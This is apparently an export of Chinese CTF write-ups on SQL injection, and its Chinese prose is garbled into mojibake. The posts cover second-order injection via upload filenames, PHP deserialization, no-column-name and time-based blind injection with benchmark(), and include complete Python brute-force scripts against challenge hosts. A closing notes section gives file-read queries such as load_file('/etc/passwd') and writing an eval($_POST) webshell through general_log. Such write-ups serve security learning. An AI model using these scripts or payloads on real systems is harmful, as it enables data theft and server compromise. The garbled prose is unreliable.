åæ¥æˆ‘æ”¹æˆäº†1'or 1=1,å‘ç°é¡µé¢æœ‰äº†ä¸ä¸€æ ·çš„å›æ˜¾ æ‰€ä»¥å¯ä»¥è¿›è¡Œå¸ƒå°”ç›²æ³¨ è„šæœ¬ç¼–å†™æ„Ÿè§‰æœ€è¿‘å†™è„šæœ¬è¶Šæ¥è¶Šå¾—å¿ƒåº”æ‰‹äº†è™½ç„¶è„šæœ¬éƒ½å¾ˆç®€å•å“ˆå“ˆå“ˆå“ˆ import requestss=requests.session()url1=&quot;http://b.y1ng.vip:2016/upload.php&quot;url2=&quot;http://b.y1ng.vip:2016/rename.php&quot;def upload(str): content=&quot;aaaa&quot; file1 = { 'upfile':(f&quot;1'{str}#.jpg&quot;,content,&quot;image/jpeg&quot;) } r = s.post(url=url1, files=file1).text #print(r)def rename(str): data={ &quot;oldname&quot;:f&quot;1'{str}#&quot;, &quot;newname&quot;:&quot;abc&quot; } r=s.post(url=url2,data=data).text return rdef sql_injection(payload): fina_word=&quot;&quot; for i in range(1,100): low=32 high=128 mid=(low+high)//2 while(low&lt;high): payload_fina=f&quot;or ascii(substr(({payload}),{i},1))&gt;{mid}&quot; upload(payload_fina) r=rename(payload_fina) if &quot;Comp 1_100002&quot; in r: low=mid+1 else: high=mid mid=(low+high)//2 if(mid==32 or mid==128): break fina_word+=chr(mid) print(fina_word)if __name__ ==&quot;__main__&quot;: # payload=&quot;database()&quot; # payload=&quot;&quot; payload=&quot;select group_concat(password) from user&quot; sql_injection(payload) è¿™æ ·å°±å¯ä»¥æ³¨å‡ºç”¨æˆ·åå’Œå¯†ç äº† XM GaCtF5QL1 ååºåˆ—åŒ–åˆ†æclass XCTFGG{ private $method; private $args; public function __construct($method, $args) { $this-&gt;method = $method; $this-&gt;args = $args; } function login() { list($username, $password) = func_get_args(); $username = strtolower(trim(mysql_escape_string($username))); $password = strtolower(trim(mysql_escape_string($password))); $sql = sprintf(&quot;SELECT * FROM user WHERE username='%s' AND password='%s'&quot;, $username, $password); global $db; $obj = $db-&gt;query($sql); $obj = $obj-&gt;fetch_assoc(); global $FLAG; if ( $obj != false &amp;&amp; $obj['privilege'] == 'admin' ) { die($FLAG); } else { die(&quot;Admin only!&quot;); } } function __destruct() { @call_user_func_array(array($this, $this-&gt;method), $this-&gt;args); }} å¯ä»¥å‘ç°ï¼Œåªè¦ç™»å½•æˆåŠŸï¼Œå°±å¯ä»¥æ‹¿åˆ°flagï¼Œæ­¤æ—¶æˆ‘ä»¬å·²ç»å¾—åˆ°è´¦å·å¯†ç äº†ï¼Œæ„é€ ä¸€ä¸‹å³å¯,çœ‹äº†ä¸€ä¸‹æºç ï¼Œåœ¨upload.phpä¸­å­˜åœ¨ååºåˆ—åŒ–çš„ç‚¹,æ–¹æ³•å¾ˆå°‘ï¼Œæ‰€ä»¥popé“¾å…¶å®å¾ˆå¥½çœ‹å‡ºï¼Œå°±æ˜¯destructçš„æ—¶å€™ä¼šä½¿ç”¨call_user_func_arrayï¼Œæ‰€ä»¥åªè¦å¯¹methodå’Œargsè¿›è¡Œèµ‹å€¼å³å¯ï¼š &lt;?phperror_reporting(0);class XCTFGG{ private $method; private $args; public function __construct($method, $args) { $this-&gt;method = $method; $this-&gt;args = $args; }}$a=new XCTFGG(&quot;login&quot;,array(&quot;XM&quot;,&quot;GaCtF5QL1&quot;));echo urlencode(serialize($a)); ä½†æ˜¯ä¸çŸ¥é“ä¸ºå•¥æ²¡æ‹¿åˆ°flag upload successfully!&lt;br /&gt;&lt;b&gt;Fatal error&lt;/b&gt;: Uncaught Error: Call to undefined function mysql_escape_string() in /var/www/html/common.php:39Stack trace:#0 /var/www/html/common.php(59): XCTFGG-&gt;login('XM', 'GaCtF5QL1')#1 /var/www/html/upload.php(47): XCTFGG-&gt;__destruct()#2 {main} thrown in &lt;b&gt;/var/www/html/common.php&lt;/b&gt; on line &lt;b&gt;39&lt;/b&gt;&lt;br /&gt;","link":"/2021/08/09/SQL%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5-GACTF-carefulleyes/"},{"title":"sql-æ— åˆ—åç›²æ³¨","text":"æ— åˆ—åç›²æ³¨æ¯”è¾ƒæ³•1.fuzzè¿‡æ»¤å†…å®¹fuzzä¸€ä¸‹ å‘ç°select å’Œunionéƒ½è¢«è¿‡æ»¤äº†ï¼Œå›é¡¾ä¸€ä¸‹selectè¢«è¿‡æ»¤æœ‰ä»€ä¹ˆèƒ½æ›¿ä»£çš„åœ¨å †å æ³¨å…¥ä¸­å¯ä»¥ä½¿ç”¨handlerï¼Œä½¿ç”¨é¢„å¤„ç†æ‹¼æ¥ç»•è¿‡ï¼Œè¿˜æœ‰mysqlçš„8.0+æ–°ç‰ˆæœ¬ä¸­çš„table table è¡¨å; åˆ¤æ–­æ³¨å…¥ç±»å‹é¡µé¢æœ‰ä¸¤ç§ä¸åŒçš„å›æ˜¾æ–¹å¼ï¼š ç¡®å®šä½¿ç”¨å¸ƒå°”ç›²æ³¨ ç¼–å†™ç›²æ³¨è„šæœ¬#payload=&quot;database()&quot;#ctfpayload=&quot;version()&quot;#8.0.26-0ubuntu0.20.04.2 ç¡®å®šç‰ˆæœ¬8.0+ä½¿ç”¨tableè¿›è¡Œæ³¨å…¥ table information_schema.tables ä½†æ˜¯æƒ³è¦è·å¾—ctfçš„é‚£ä¸ªè¡¨çš„ç›¸å…³åˆ—æ•°æ®ï¼Œæˆ‘ä»¬è¿˜éœ€è¦è‡ªå·±å»æ³¨éš¾ç‚¹ï¼šç”±äºtable æ²¡æœ‰where ä¹Ÿæ²¡æœ‰group_concatï¼Œæ‰€ä»¥æˆ‘ä»¬æ— æ³•æŒ‰ç…§å¸¸è§„æ–¹æ³•å¾—åˆ°ctfçš„é‚£ä¸ªåº“æœ‰ä»€ä¹ˆè¡¨ï¼Œæ­¤æ—¶å°±éœ€è¦ä½¿ç”¨æ— åˆ—åç›²æ³¨ã€‚å…ˆé€šè¿‡æ— åˆ—åç›²æ³¨æ³¨å‡ºctfä¸‹çš„è¡¨ï¼Œåœ¨é€šè¿‡æ— åˆ—åç›²æ³¨æ³¨å‡ºctfä¸‹çš„å­—æ®µæ•°æ® è¡¨ä½ç½®æ¢æµ‹åˆ©ç”¨æ¯”è¾ƒæ³•ï¼šé¦–å…ˆæˆ‘ä»¬éœ€è¦æ‰¾å‡ºå“ªä¸€è¡Œæ˜¯æˆ‘ä»¬éœ€è¦çš„,æœ¬åœ°æµ‹è¯•å‘ç°ï¼Œinformation_schema.tablesæœ‰21ä¸ªåˆ—ï¼Œå¹¶ä¸”ç¬¬ä¸€ä¸ªå­—æ®µå€¼ä¸ºdef ç¬¬äºŒä¸ªä¸ºæ•°æ®åº“ï¼Œç”±äºæˆ‘ä»¬å·²ç»çŸ¥é“æ•°æ®åº“åå­—äº†ï¼Œæ‰€ä»¥å¯ä»¥è¿™æ ·åˆ¤æ–­ï¼Œä¸æ–­æ›´æ”¹limitçš„å€¼ï¼Œåˆ¤æ–­ç»“æœæ˜¯å¦ä¸º1 å¹¶ä¸”å¯ä»¥åˆ©ç”¨è¿™ä¸ªè½¬æŠ˜ç‚¹è¿›è¡Œåˆ¤æ–­æ˜¯å¦ä¸ºæˆ‘ä»¬éœ€è¦çš„åº“ å†™ä¸€ä¸ªæ¢æµ‹çš„è„šæœ¬æœ¬æ¥æ˜¯æƒ³æŒ‰ç…§ä¸Šé¢é‚£ä¸ªæ€è·¯å†™çš„è„šæœ¬ï¼Œä½†æ˜¯å‘ç°æ²¡æœ‰æ¢æµ‹å‡ºæ¥ï¼Œäºæ˜¯æ¢äº†ä¸€ç§æ€è·¯ï¼Œç›´æ¥ä»ç¬¬ä¸€ä½å¼€å§‹ï¼Œå› ä¸ºæˆ‘å·²ç»çŸ¥é“æ•°æ®åº“çš„åå­—æ˜¯ctfï¼Œæ‰€ä»¥æŒ‰ç…§ order by table_schemaçš„æ’åº é‚£ä¹ˆè¿™ä¸ªè¡¨å°±ä¼šåœ¨æ¯”è¾ƒå‰é¢çš„ä½ç½® def search_co(): for i in range(0,100): payload=f&quot;admin'and/**/('def','d',1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1)&lt;(table information_schema.tables order by table_schema limit {i},1)#&quot;.replace(&quot; &quot;,&quot;/**/&quot;) data1={ 'username':payload, 'password':&quot;123&quot; } #print(data1) #print(s.post(url=url,data=data1).text) if &quot;username error!&quot; in s.post(url=url,data=data1).text: print(&quot;ctfåº“åœ¨ç¬¬&quot;,i,&quot;åˆ—&quot;) çˆ†ç ´è¡¨è„šæœ¬ï¼šè¿™ä¸ªç¡®å®èŠ±äº†æˆ‘å¥½å¤šæ—¶é—´ï¼Œä¸»è¦åŸå› è¿˜æ˜¯åœ¨äºè¯­å¥çš„ä¹¦å†™ä¸Š æœ‰ä¸ªç»†èŠ‚ï¼Œå°±æ˜¯æˆ‘ä»¬çš„è¡¨åé¢é‚£ä¸ªå­—æ®µä¹Ÿæ˜¯éœ€è¦ç©ºå‡ºæ¥çš„ï¼Œä¸ç„¶å°±ä¼šé€ æˆæ”¹å­—æ®µæ²¡æ¯”å®Œçš„æƒ…å†µ,è¿˜æœ‰å¦ä¸€ä¸ªç»†èŠ‚æ˜¯ä¸€äº›ç‰¹æ®Šå­—ç¬¦æ˜¯ä¸èƒ½å»è¿›è¡Œæ¯”è¾ƒçš„ï¼Œä¸ç„¶çš„è¯å°±ç›´æ¥å‡ºé”™äº†ã€‚ã€‚ã€‚ def sql_injection_s(): fina_wod=&quot;&quot; a=&quot;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&quot; for i in range(0,100): for j in range(0,62): payload_2=f&quot;admin'and (('def','ctf','{fina_wod+a[j]}','',1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1)&lt;(table information_schema.tables order by TABLE_SCHEMA limit 0,1))#&quot;.replace(&quot; &quot;,&quot;/**/&quot;) data={ 'username':payload_2, 'password':&quot;1&quot; } r = s.post(url=url, data=data).text #print(data) if &quot;username error&quot; in r: fina_wod+=a[j-1] print(fina_wod) break çˆ†ç ´å‡ºæ¥ä»¥åæœ‰ä¸€ä¸ªadminï¼Œè¿˜æœ‰å¦å¤–ä¸€ä¸ªæ˜¯f11114g çˆ†ç ´flagtable è¡¨å limit 1,1; ä¹‹å‰ä¸ºä»€ä¹ˆéœ€è¦çŸ¥é“åˆ—åï¼Ÿå› ä¸ºåˆ—å¤šï¼Œå¦‚æœæˆ‘ä»¬ç›´æ¥ç”¨substræˆªå–çš„è¯ä¼šæŠ¥é”™é‚£ä¹ˆæ„å‘³ç€ï¼Œå¦‚æœåªæœ‰ä¸€åˆ— é‚£ä¹ˆsubstræˆªå–å°±å¯ä»¥ä¸ç”¨åˆ—åä¹Ÿå¯ä»¥é€‰å–äº†ï¼šæ‰€è¿™é‡Œå†™è„šæœ¬å°±å¾ˆå®¹æ˜“äº†ç›´æ¥ç”¨çˆ†ç ´åº“åçš„è„šæœ¬æ¥å°±è¡Œ table f11114g limit 0,1 éœ€è¦æ³¨æ„çš„æ˜¯ ç¬¬ä¸€è¡Œæ²¡æœ‰flagï¼Œç¬¬äºŒè¡Œæ‰æ˜¯ def sql_injection(pay_lo):#åº“åå’Œç‰ˆæœ¬ fina_wod=&quot;&quot; for i in range(1,100): low=32 high=128 mid=(low+high)//2 while(low&lt;high): payload_1=f&quot;admin'and ascii(substr(({payload}),{i},1))&gt;{mid}#&quot;.replace(&quot; &quot;,&quot;/**/&quot;) data={ 'username':payload_1, 'password':&quot;1&quot; } #print(data) r=s.post(url=url,data=data).text #print(r) if &quot;password error!&quot; in r: low = mid + 1 else: high = mid mid = (low + high) // 2 if (mid == 32 or mid == 128): break fina_wod += chr(mid) print(fina_wod) flag{8848f380-dce6-4184-a3d8-430e72c4eca0} å®Œæ•´è„šæœ¬ï¼š import requestss=requests.session()url=&quot;&quot;def sql_injection(pay_lo):#åº“åå’Œç‰ˆæœ¬ fina_wod=&quot;&quot; for i in range(1,100): low=32 high=128 mid=(low+high)//2 while(low&lt;high): payload_1=f&quot;admin'and ascii(substr(({payload}),{i},1))&gt;{mid}#&quot;.replace(&quot; &quot;,&quot;/**/&quot;) data={ 'username':payload_1, 'password':&quot;1&quot; } #print(data) r=s.post(url=url,data=data).text #print(r) if &quot;password error!&quot; in r: low = mid + 1 else: high = mid mid = (low + high) // 2 if (mid == 32 or mid == 128): break fina_wod += chr(mid) print(fina_wod)def sql_injection_s():#è¡¨å fina_wod=&quot;&quot; a=&quot;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&quot; for i in range(0,100): for j in range(0,62): payload_2=f&quot;admin'and (('def','ctf','{fina_wod+a[j]}','',1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1)&lt;(table information_schema.tables order by TABLE_SCHEMA limit 1,1))#&quot;.replace(&quot; &quot;,&quot;/**/&quot;) data={ 'username':payload_2, 'password':&quot;1&quot; } r = s.post(url=url, data=data).text #print(data) if &quot;username error&quot; in r: fina_wod+=a[j-1] print(fina_wod) breakdef search_co():#æ¢æµ‹è¡¨åœ¨ç¬¬å‡ ä¸ª for i in range(0,10000): payload=f&quot;admin'and/**/('def','ct',1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1)&lt;(table information_schema.tables order by table_schema desc limit {i},1)#&quot;.replace(&quot; &quot;,&quot;/**/&quot;) data1={ 'username':payload, 'password':&quot;123&quot; } #print(data1) #print(s.post(url=url,data=data1).text) if &quot;username error!&quot; in s.post(url=url,data=data1).text: print(&quot;ctfåº“åœ¨ç¬¬&quot;,i,&quot;åˆ—&quot;)if __name__==&quot;__main__&quot;: #payload=&quot;database()&quot;#ctf #payload=&quot;version()&quot;#8.0.26-0ubuntu0.20.04.2 payload=&quot;table f11114g limit 1,1&quot; #search_co() #print_word() sql_injection(payload) #sql_injection_s() unionè”åˆfuzzè¿‡æ»¤å†…å®¹çœ‹äº†ä¸€ä¸‹è¿‡æ»¤äº†æœ€é‡è¦çš„infoåº“ï¼Œå°±æ„å‘³ç€å¤§æ¦‚ç‡æ˜¯æ— åˆ—åç›²æ³¨äº†ï¼Œç„¶åè¿‡æ»¤äº†ä¸€äº›æ¯”è¾ƒç¬¦å·ï¼Œè¿˜æœ‰likerlikeç­‰æ­£åˆ™åŒ¹é…å‡½æ•°ï¼Œé‚£ä¹ˆæœ¬é¢˜ä¼¼ä¹åªèƒ½ç”¨case whenäº†çš„æ„Ÿè§‰æ¥ä¸‹ åˆ¤æ–­æ³¨å…¥ç±»å‹å¸ƒå°”ç›²æ³¨ï¼Œå›æ˜¾åˆ†ä¸º æµ‹è¯•è¯­å¥ï¼š:root'and/**/case/**/1/**/when/**/1/**/then/**/1/**/else/**/0/**/end#true:welcomt adminfalse:wrong ç¼–å†™ç›²æ³¨è„šæœ¬ï¼šæ„é€ æ³¨å…¥è¯­å¥è¿™é¢˜çš„æˆªå–å‡½æ•°åŸºæœ¬éƒ½è¿‡æ»¤äº†ï¼Œæ‰€ä»¥è¿™é‡Œä½¿ç”¨ æ¥ä¸‹æ¥å°±æ˜¯è·‘è¡¨åï¼Œç”±äºinåº“è¢«è¿‡æ»¤äº†ï¼Œè¿™é‡Œè¯•äº†ä¸€ä¸‹ å‘ç° select group_concat(table_name) from sys.schema_table_statistics; æ˜¯å¯ä»¥çš„ å°±å¯ä»¥è·‘å‡ºè¡¨åäº†æ¥ä¸‹æ¥ä½¿ç”¨unionæ— åˆ—åç›²æ³¨ select a.1 from (select 1,2 union select * from `SeCrrreT`)a limit 1,2 å¾—åˆ°è¡¨åä»¥å ç›´æ¥select * from SeCrrreTè·‘ä¸å‡ºæ¥ï¼Œæ‰€ä»¥å¯ä»¥çŒœæƒ³è‚¯å®šä¸æ­¢ä¸€è¡Œï¼Œæ‰€ä»¥åé¢è¦åŠ limit ç„¶åç”¨æ— åˆ—åç›²æ³¨ï¼Œå»å°è¯•å­—æ®µæ•° import requestsimport stringurl=&quot;http://a.y1ng.vip:1119/&quot;s=requests.session()def sql_injection(payload): data1=&quot;&quot; for i in range(1,100): for j in range(32,128): payload_tr=f&quot;root'and case ascii(reverse(left(({payload}),{i}))) when {j} then 1 else 0 end#&quot;.replace(&quot; &quot;,&quot;/**/&quot;) data={ &quot;username&quot;:payload_tr, &quot;password&quot;:&quot;1141&quot; } r=s.post(url=url,data=data).text #print(r) #print(data) if &quot;Welcome Admin!&quot; in r: data1+=chr(j) print(data1) breakif __name__==&quot;__main__&quot;: #payload=&quot;database()&quot;#ctfgame #payload=&quot;select group_concat(table_name) from sys.schema_table_statistics&quot;#users,SeCrrreT payload=&quot;select a.1 from (select 1,2 union select * from `SeCrrreT`)a limit 1,2&quot;#flag{fab99a66-23db-47b1-9db4-9262664d76a8} sql_injection(payload) æˆ‘ç”¨çš„æ˜¯case whenè¿›è¡Œç›²æ³¨ï¼Œçœ‹äº†ä¸€ä¸‹å¸ˆå‚…çš„ ï¼Œä»–ä½¿ç”¨çš„æ˜¯betweenæ¥æ›¿ä»£æ²¡æœ‰äº†çš„æ¯”è¾ƒå‡½æ•° &quot;username&quot; : f&quot;root' and (ascii(reverse(left(({select}),{i}))) between {ascii} and {ascii+1})#&quot;.replace(&quot; &quot;, &quot;/**/&quot;), è¿™æ˜¯ä»–çš„è¯­å¥ï¼Œæ”¶è—èµ·æ¥äº†~","link":"/2021/08/09/sql-%E6%97%A0%E5%88%97%E5%90%8D%E7%9B%B2%E6%B3%A8/"},{"title":"sqlæ—¶é—´ç›²æ³¨","text":"å‰æœŸæµ‹è¯•ç¡®å®šæ³¨å…¥ç‚¹ä»¥åŠè¿‡æ»¤å†…å®¹å‘ç°usernameå¿…é¡»æ˜¯adminï¼Œå¦‚æœä¸æ˜¯adminæ··æœ‰å…¶ä»–å­—ç¬¦çš„è¯å°±ä¼šè¿”å›you are not adminï¼Œä½†æ˜¯passwordå¯ä»¥æ³¨å…¥ï¼Œå…ˆfuzzä¸€ä¸‹è¿‡æ»¤çš„å­—ç¬¦ï¼Œè¿‡æ»¤substrã€unionç­‰å­—ç¬¦ï¼Œä¹Ÿè¿‡æ»¤äº†sleepï¼ŒåŒæ—¶è¿˜è¿‡æ»¤äº†ç©ºæ ¼ ç¡®å®šæ³¨å…¥ç±»å‹å‘ç°ä¸è®ºè¾“å…¥çš„å†…å®¹æ˜¯ä»€ä¹ˆ é¡µé¢çš„å›æ˜¾å‡æ˜¯password errorï¼Œæ‰€ä»¥å°è¯•ä¸€ä¸‹æ—¶é—´ç›²æ³¨çš„è¯­å¥ï¼Œä½†æ˜¯è¿‡æ»¤äº†sleepé‚£ä¹ˆå°±éœ€è¦ä½¿ç”¨benchmarkï¼Œç”±äºsubsträ»¥åŠæ¯”è¾ƒç¬¦ä¹‹ç±»çš„éƒ½æ²¡äº†ï¼Œæ‰€ä»¥è¿™é‡Œå°±ç”¨inäº† 1'or/**/case/**/1/**/when/**/1/**/then/**/1/**/else/**/benchmark(1000000,sha1(sha1(sha1(sha1(sha1(sha1(sha1('HWG'))))))))end# ç¼–å†™ç›²æ³¨è„šæœ¬ï¼šä¸€å¼€å§‹åœ¨å†™çš„æ—¶å€™ å¿˜è®°asciiä¸è§äº†ï¼Œæ‰€ä»¥å†™çš„è¿˜æŒºé¡ºçš„ï¼Œåæ¥å‘ç°ä¸è§äº†ï¼Œäºæ˜¯å°±è¦é‡æ–°ä¿®æ”¹ä¸€ä¸‹ï¼Œæƒ³åˆ°ä¹‹å‰åˆšå­¦çš„hexäºæ˜¯å°±ç”¨hexè¿›è¡Œä¹¦å†™ä¸€ä¸‹è¯•è¯• import requestsimport timeimport binasciiurl=&quot;http://a.y1ng.vip:1102/index.php&quot;s=requests.session()def hex_tran(s): return hex(s).replace(&quot;0x&quot;, &quot;&quot;)def tran_str(g): tran_tmp=&quot;&quot; g = binascii.unhexlify(g) print(g.decode('utf-8')) tran_tmp=g print(tran_tmp[::-1]) return tran_tmp[::-1]def sql_injection(payload:str): wd_tr=&quot;&quot; for j in range(1,100): for i in range(32,128): payload_fina=f&quot;1'or/**/case/**/(select/**/hex(right(({payload}),{j}))/**/in/**/('{hex_tran(i)+wd_tr}'))/**/when/**/1/**/then/**/benchmark(100000,sha1(sha1(sha1(sha1(sha1(sha1(sha1('HWG'))))))))/**/else/**/1/**/end#&quot; data={ &quot;username&quot;:&quot;admin&quot;, &quot;password&quot;:payload_fina } print(data) times=time.time() r=s.post(url,data=data).text if time.time()-times &gt;= 4: wd_tr=f&quot;{hex_tran(i)}&quot;+wd_tr print(wd_tr) break if i==127: wd_tr = tran_str(wd_tr) print(wd_tr) exit(0)if __name__ ==&quot;__main__&quot;: #payload=&quot;database()&quot; #payload=&quot;select group_concat(table_name) from information_schema.tables where table_schema in (select database())&quot;.replace(&quot; &quot;,&quot;/**/&quot;) #payload=&quot;select group_concat(column_name) from information_schema.columns where table_name in ('Fl49ish3re')&quot;.replace(&quot; &quot;,&quot;/**/&quot;) payload=&quot;select group_concat(f1aG123) from Fl49ish3re&quot;.replace(&quot; &quot;,&quot;/**/&quot;)#flag{08e687c1-cc68-4db0-9924-407792caf20e} sql_injection(payload) ä½†æ˜¯å‘ç°åªèƒ½æ‰“å°ä¸€éƒ¨åˆ†è¡¨çš„æ„Ÿè§‰ï¼Œä½†æ˜¯asciiç è¡¨éƒ½é½äº†å‘€â€“å°±å¾ˆå¥‡æ€ªã€‚ã€‚ã€‚åœ¨æœ¬åœ°æµ‹è¯•äº†ä¸€ä¸‹ï¼Œå› ä¸ºæˆ‘ä»¬æ˜¯åå…­è¿›åˆ¶çš„ï¼Œæ‰€ä»¥ä¼šå‡ºç°abcdefè¿™äº›å­—æ¯ï¼Œä½†æ˜¯åœ¨mysqlä¸­ è¿™äº›å­—æ¯æ˜¯å¤§å†™çš„ï¼Œä½†æ˜¯åœ¨pythonä¸­çš„è½¬åŒ–ç»“æœæ˜¯å°å†™çš„ï¼Œç„¶åæˆ‘ä»¬è¿˜ä½¿ç”¨äº†binaryï¼ŒåŒºåˆ†å¤§å°å†™ï¼Œæ‰€ä»¥å°±è·‘ä¸å‡ºæ¥äº†ï¼Œè¿™é‡Œæˆ‘ä»¬å¯ä»¥å°†binaryå»æ‰ï¼Œè¿™æ ·å°±æ²¡å…³ç³»äº† å¡å£³ç‚¹ä¸»è¦æ˜¯è¿˜æ˜¯ç¼–ç¨‹èƒ½åŠ›å¤ªå¼±ï¼Œè¿˜éœ€å¤šåŠ é”»ç‚¼ç„¶åå°±æ˜¯é‚£ä¸ªbinaryåŒºåˆ†å¤§å°å†™çš„ï¼Œå¦‚æœæ˜¯ç”¨å­—ç¬¦å»æ³¨çš„è¯å°±éœ€è¦åŒºåˆ†äº†ï¼Œä½†æ˜¯è¿™é‡Œä¸æ˜¯ï¼Œç›´æ¥ç”¨åå…­è¿›åˆ¶å°±ä¸ç”¨äº†","link":"/2021/08/01/sql%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/"},{"title":"å †å +æ— åˆ—å+æ—¶é—´ç›²æ³¨","text":"å»¶æ—¶ç›²æ³¨å»¶æ—¶å‡½æ•°ï¼šsleep()select sleep(); benchmark()select benchmark(100000,sha1(sha1(sha1('tlfie')))); get_lockåœ¨ä¸€ä¸ªsessionä¸­å…ˆé”å®šä¸€ä¸ªå˜é‡ ç„¶åé€šè¿‡å¦ä¸€ä¸ªsessionï¼Œå†æ¬¡æ‰§è¡Œget_lockå‡½æ•° select get_lock('tlife',1);select get_lock('tlife',5); ä½†ä¹Ÿä¸æ˜¯æ¯æ¬¡éƒ½èƒ½ç”¨ï¼Œéœ€è¦æä¾›é•¿è¿æ¥ï¼Œåœ¨Apache+PHPæ­å»ºçš„ç¯å¢ƒä¸­éœ€è¦ä½¿ç”¨mysql_pconnectå‡½æ•°æ¥è¿æ¥æ•°æ®åº“ï¼Œæ‰€ä»¥åªèƒ½æ ¹æ®ç¯å¢ƒå»å®é™…æµ‹è¯•ä¸€ä¸‹ï¼Œæˆ‘åœ¨æœ¬åœ°ä¹Ÿæ²¡æµ‹è¯•æˆåŠŸ æ­£åˆ™è¡¨è¾¾å¼å»¶æ—¶æ­£åˆ™åŒ¹é…åœ¨åŒ¹é…è¾ƒé•¿å­—ç¬¦ä¸²ä½†è‡ªç”±åº¦æ¯”è¾ƒé«˜çš„å­—ç¬¦ä¸²æ—¶ï¼Œä¼šé€ æˆæ¯”è¾ƒå¤§çš„è®¡ç®—é‡ï¼Œæˆ‘ä»¬é€šè¿‡rpadæˆ–repeatæ„é€ é•¿å­—ç¬¦ä¸²ï¼ŒåŠ ä»¥è®¡ç®—é‡å¤§çš„patternï¼Œé€šè¿‡æ§åˆ¶å­—ç¬¦ä¸²é•¿åº¦æˆ‘ä»¬å¯ä»¥æ§åˆ¶å»¶æ—¶ã€‚ select rpad('a',4999999,'a') RLIKE concat(repeat('(a.*)+',30),'b'); æ–‡ä»¶æ“ä½œmysqlå˜é‡å¯ä»¥é€šè¿‡ show variables æ¥æŸ¥çœ‹ç³»ç»Ÿå˜é‡ä»¥åŠå…¶å€¼ å’Œæ–‡ä»¶æœ‰å…³çš„å˜é‡secure_file_privsecure_file_privå¯¹è¯»å†™æ–‡ä»¶æœ‰å½±å“ã€‚ secure-file-privå‚æ•°æ˜¯ç”¨æ¥é™åˆ¶LOAD DATA, SELECT â€¦ OUTFILE, and LOAD_FILE()ä¼ åˆ°å“ªä¸ªæŒ‡å®šç›®å½•çš„ã€‚ å½“secure_file_privçš„å€¼ä¸ºnull ï¼Œè¡¨ç¤ºé™åˆ¶mysqldä¸å…è®¸å¯¼å…¥|å¯¼å‡ºã€‚é»˜è®¤æ˜¯nul lå½“secure_file_privçš„å€¼ä¸º/tmp/ ï¼Œè¡¨ç¤ºé™åˆ¶mysqldçš„å¯¼å…¥|å¯¼å‡ºåªèƒ½å‘ç”Ÿåœ¨/tmp/ç›®å½•ä¸‹ å½“secure_file_privçš„å€¼æ²¡æœ‰å…·ä½“å€¼æ—¶ï¼Œè¡¨ç¤ºä¸å¯¹mysqldçš„å¯¼å…¥|å¯¼å‡ºåšé™åˆ¶ è¯»æ–‡ä»¶select load_file('/flag')select CONVERT(LOAD_FILE(&quot;/etc/passwd&quot;) USING utf8); å†™æ–‡ä»¶select &quot;&lt;?php phpinfo();?&gt;&quot; into outfile &quot;/tmp/1.php&quot;select &quot;&lt;?php phpinfo();?&gt;&quot; into dumpfile &quot;/tmp/1.php&quot; outfileå‡½æ•°åœ¨å°†æ•°æ®å†™åˆ°æ–‡ä»¶é‡Œæ—¶æœ‰ç‰¹æ®Šçš„æ ¼å¼è½¬æ¢ï¼Œè€Œdumpfileåˆ™ä¿æŒåŸæ•°æ®æ ¼å¼ å †å æ³¨å…¥å †å æ³¨å…¥æ¡ä»¶$mysqli-&gt;multi_query($sql); å½“secure_file_privä¸ºnullæ—¶å¦‚æœå †å æ³¨å…¥ï¼Œå¯ä»¥åˆ©ç”¨logæ—¥å¿—æ–‡ä»¶å†™é©¬ set global general_log=on;set global general_log_file='xxxx';-- è®¾ç½®æ—¥å¿—æ–‡ä»¶ä¿å­˜ä½ç½®select '&lt;?php eval($_POST['a']); ?&gt;';-- è¯¥å†…å®¹å°†ä¼šè¢«å†™å…¥æ—¥å¿—ä¸­ å †å æ³¨å…¥ä¸­selectè¢«è¿‡æ»¤handlermysqlé™¤å¯ä½¿ç”¨selectæŸ¥è¯¢è¡¨ä¸­çš„æ•°æ®ï¼Œä¹Ÿå¯ä½¿ç”¨handlerè¯­å¥ï¼Œè¿™æ¡è¯­å¥ä½¿æˆ‘ä»¬èƒ½å¤Ÿä¸€è¡Œä¸€è¡Œçš„æµè§ˆä¸€ä¸ªè¡¨ä¸­çš„æ•°æ®ï¼Œä¸è¿‡handlerè¯­å¥å¹¶ä¸å…·å¤‡selectè¯­å¥çš„æ‰€æœ‰åŠŸèƒ½ã€‚å®ƒæ˜¯mysqlä¸“ç”¨çš„è¯­å¥ï¼Œå¹¶æ²¡æœ‰åŒ…å«åˆ°SQLæ ‡å‡†ä¸­ã€‚ handler users open as hd; #æŒ‡å®šæ•°æ®è¡¨è¿›è¡Œè½½å…¥å¹¶å°†è¿”å›å¥æŸ„é‡å‘½åhandler hd read first; #è¯»å–æŒ‡å®šè¡¨/å¥æŸ„çš„é¦–è¡Œæ•°æ®handler hd read next;#è¯»å–æŒ‡å®šè¡¨/å¥æŸ„çš„ä¸‹ä¸€è¡Œæ•°æ®handler hdclose; #å…³é—­å¥æŸ„ mysqlé¢„å¤„ç†ä¸€ã€SQL è¯­å¥çš„æ‰§è¡Œå¤„ç†1ã€å³æ—¶ SQL ä¸€æ¡ SQL åœ¨ DB æ¥æ”¶åˆ°æœ€ç»ˆæ‰§è¡Œå®Œæ¯•è¿”å›ï¼Œå¤§è‡´çš„è¿‡ç¨‹å¦‚ä¸‹ï¼š 1. è¯æ³•å’Œè¯­ä¹‰è§£æï¼› 2. ä¼˜åŒ– SQL è¯­å¥ï¼Œåˆ¶å®šæ‰§è¡Œè®¡åˆ’ï¼› 3. æ‰§è¡Œå¹¶è¿”å›ç»“æœï¼› å¦‚ä¸Šï¼Œä¸€æ¡ SQL ç›´æ¥æ˜¯èµ°æµç¨‹å¤„ç†ï¼Œä¸€æ¬¡ç¼–è¯‘ï¼Œå•æ¬¡è¿è¡Œï¼Œæ­¤ç±»æ™®é€šè¯­å¥è¢«ç§°ä½œ Immediate Statements ï¼ˆå³æ—¶ SQLï¼‰ã€‚2ã€é¢„å¤„ç† SQL 